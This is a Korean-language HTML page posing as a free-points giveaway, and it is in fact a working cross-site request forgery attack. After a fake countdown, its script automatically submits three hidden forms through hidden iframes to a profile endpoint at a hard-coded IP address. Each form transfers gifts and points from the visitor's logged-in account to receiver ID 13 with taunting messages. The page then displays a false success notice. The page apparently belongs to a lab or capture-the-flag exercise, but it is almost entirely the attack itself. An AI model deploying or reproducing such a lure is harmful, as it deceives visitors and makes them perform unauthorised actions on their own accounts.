<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
            width: 90%;
        }
        .title { font-size: 2.5em; margin-bottom: 20px; }
        .subtitle { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
        .countdown { font-size: 3em; color: #FFD700; font-weight: bold; margin: 20px 0; }
        .progress-bar { width: 100%; height: 20px; background: rgba(255,255,255,0.3); border-radius: 10px; margin: 20px 0; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff88, #00cc6a); width: 0%; transition: width 0.5s ease; }
        .success { color: #00FF88; font-size: 1.8em; font-weight: bold; }
        .pulse { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title pulse">🎁 특별 이벤트!</h1>
        <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
        
        <div id="loading-section">
            <div>
                <p>💰 포인트 지급을 준비하고 있습니다...</p>
                <p class="countdown" id="countdown">5</p>
                <p>초 후 자동으로 포인트가 지급됩니다!</p>
            </div>
            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
            <p id="status">🔄 시스템 연결 중...</p>
        </div>
        
        <div id="success-section" style="display: none;">
            <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
            <p style="font-size: 1.3em; margin: 20px 0;">💰 1200P가 성공적으로 지급되었습니다!</p>
        </div>
    </div>

    <!-- 다중 방식 시도 -->
    <iframe name="target1" style="display:none;"></iframe>
    <iframe name="target2" style="display:none;"></iframe>
    <iframe name="target3" style="display:none;"></iframe>
    
    <!-- HTTP 버전 -->
    <form id="form1" method="POST" action="http://52.78.58.98/profile.php" target="target1" style="display:none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="3">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="coffee">
        <input type="hidden" name="message" value="어 개털렸죠?">
    </form>
    
    <!-- HTTPS 버전 -->
    <form id="form2" method="POST" action="https://52.78.58.98/profile.php" target="target2" style="display:none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="4">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="tea">
        <input type="hidden" name="message" value="빢빢이">
    </form>
    
    <form id="form3" method="POST" action="http://52.78.58.98/profile.php" target="target3" style="display:none;">
        <input type="hidden" name="receiver_id" value="13">
        <input type="hidden" name="points" value="5">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="gift_type" value="cake">
        <input type="hidden" name="message" value="빤딲빤딲">
    </form>

    <script>
        let countdown = 5;
        const countdownEl = document.getElementById('countdown');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const loadingSection = document.getElementById('loading-section');
        const successSection = document.getElementById('success-section');
        
        const statusMessages = [
            '🔄 서버에 연결하고 있습니다...',
            '🔐 보안 인증을 확인하고 있습니다...',
            '💰 포인트 지급 시스템을 준비하고 있습니다...',
            '⚡ 포인트를 전송하고 있습니다...',
            '✅ 전송을 완료하고 있습니다...'
        ];
        
        let messageIndex = 0;
        
        const timer = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;
            progressBar.style.width = ((5-countdown) * 20) + '%';
            
            if (messageIndex < statusMessages.length) {
                statusEl.textContent = statusMessages[messageIndex++];
            }
            
            if (countdown <= 0) {
                clearInterval(timer);
                executeAttack();
            }
        }, 1000);
        
        function executeAttack() {
            console.log('🎯 다중 방식 공격 시작...');
            statusEl.textContent = '💸 포인트를 전송하고 있습니다...';
            progressBar.style.width = '100%';
            
            // 폼 방식으로 시도
            setTimeout(() => { 
                console.log('📤 HTTP 방식 시도...');
                document.getElementById('form1').submit(); 
            }, 500);
            
            setTimeout(() => { 
                console.log('📤 HTTPS 방식 시도...');
                document.getElementById('form2').submit(); 
            }, 1500);
            
            setTimeout(() => { 
                console.log('📤 추가 HTTP 시도...');
                document.getElementById('form3').submit(); 
            }, 2500);
            
            setTimeout(() => {
                loadingSection.style.display = 'none';
                successSection.style.display = 'block';
                console.log('✅ 공격 시퀀스 완료!');
            }, 4000);
        }
    </script>
</body>
</html>
